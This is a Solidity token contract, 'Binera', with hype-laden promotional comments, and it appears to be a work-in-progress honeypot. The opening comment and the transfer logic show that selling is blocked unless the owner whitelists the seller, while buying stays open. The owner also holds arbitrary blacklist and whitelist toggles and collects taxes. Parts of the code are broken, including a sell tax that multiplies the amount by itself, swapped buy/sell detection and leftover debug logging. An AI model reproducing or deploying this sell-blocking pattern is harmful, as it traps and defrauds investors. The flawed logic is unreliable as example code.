// This is to test the transfer function to see if you can buy yet not sell, error for buying even when whitelisted. Can sell?? 

// SPDX-License-Identifier: MIT

/*
Welcome to Binera.

Telegram: https://t.me/Binera/
Twitter: https://twitter.com/Binera/
Website: https://Binera.io
95% of tokens - LOCKED at TrustSwap!
Only 5% for presale on PancakeSwap.
All liquidity Tokens burned!
Are You ready to the moon?
x100000000000000
*/

pragma solidity 0.8.19;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "hardhat/console.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
   
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256; // Use SafeMath for uint256 operations

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    address PancakeSwapAddress = 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F;
    uint256 private _taxFee;
    string private _name;
    string private _symbol;
    uint256 private _buyTax;
    uint256 private _sellTax;
    address private _taxAccount;
    mapping(address => bool) public blacklisted;
    mapping(address => bool) public whitelisted;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 buyTax,
        uint256 sellTax,
        address taxAccount_
    ) {
        _name = name_;
        _symbol = symbol_;
        _sellTax = sellTax;
        _buyTax = buyTax;
        _taxAccount = taxAccount_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }
    
    function blacklist(address _address) external onlyOwner {
        if (blacklisted[_address]) {
            blacklisted[_address] = false;
        }
        else {
            blacklisted[_address] = true;
        }
    }
    
    function whilelist(address _address) external onlyOwner {
        if (whitelisted[_address]) {
            whitelisted[_address] = false;
        }
        else {
            whitelisted[_address] = true;
        }
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            _approve(sender, _msgSender(), currentAllowance.sub(amount));
        }

        _transfer(sender, recipient, amount);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance.sub(subtractedValue));
        return true;
    }




    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        bool isBuyTransfer = (recipient == PancakeSwapAddress);
        bool isSellTransfer = (sender == PancakeSwapAddress); 
        // require(recipient != address(0), "ERC20: transfer to the zero address");
        // console.log("bbaaa");

        // require(amount > 0, "ERC20: transfer amount must be greater than zero");
        //                         console.log("bab");
        // require(!blacklisted[sender], "ERC20: contract must be frontloaded");
                        console.log("bb");
        uint256 taxAmount;
        if (isBuyTransfer) {
                console.log("a");
            taxAmount = amount.div(100) * _buyTax; 

        } else if (isSellTransfer) {

                console.log("b");
            taxAmount = amount * amount.div(100) * _sellTax;
            require(whitelisted[sender], "");

        }
        else {
            if (_sellTax >= _buyTax) {
                console.log("c");
                taxAmount = amount.div(100) * _sellTax;


            }
            else {
                taxAmount = amount.div(100) * _buyTax; 
                console.log("d");

            }
        }
        // console.log();
        // console.log(amount *( _buyTax.div(100)));
        // console.log(taxAmount);
        // console.log(_buyTax);
        // console.log(_sellTax);

        uint256 senderBalance = _balances[sender];

        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 transferAmount = amount.sub(taxAmount);
        _balances[sender] = senderBalance.sub(amount);

        _balances[recipient] = _balances[recipient].add(transferAmount);
        _balances[_taxAccount] = _balances[_taxAccount].add(taxAmount);

        emit Transfer(sender, recipient, transferAmount);
        emit Transfer(sender, _taxAccount, taxAmount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance.sub(amount);
        _totalSupply = _totalSupply.sub(amount);

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    modifier onlyOwner() {
        require(_taxAccount == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function setTaxFee(uint256 taxFee) external onlyOwner {
        require(taxFee <= 100, "Tax fee cannot be greater than 100%");
        _taxFee = taxFee;
    }

    function getTaxFee() external view returns (uint256) {
        return _taxFee;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract Binera is ERC20 {
    constructor () ERC20("Binera", "BNA", 10, 20, 0x4196719121467F763dBc6E654c551900f122b339) {    
        _mint(msg.sender, 100000 * 10 ** 18); 
    }
}
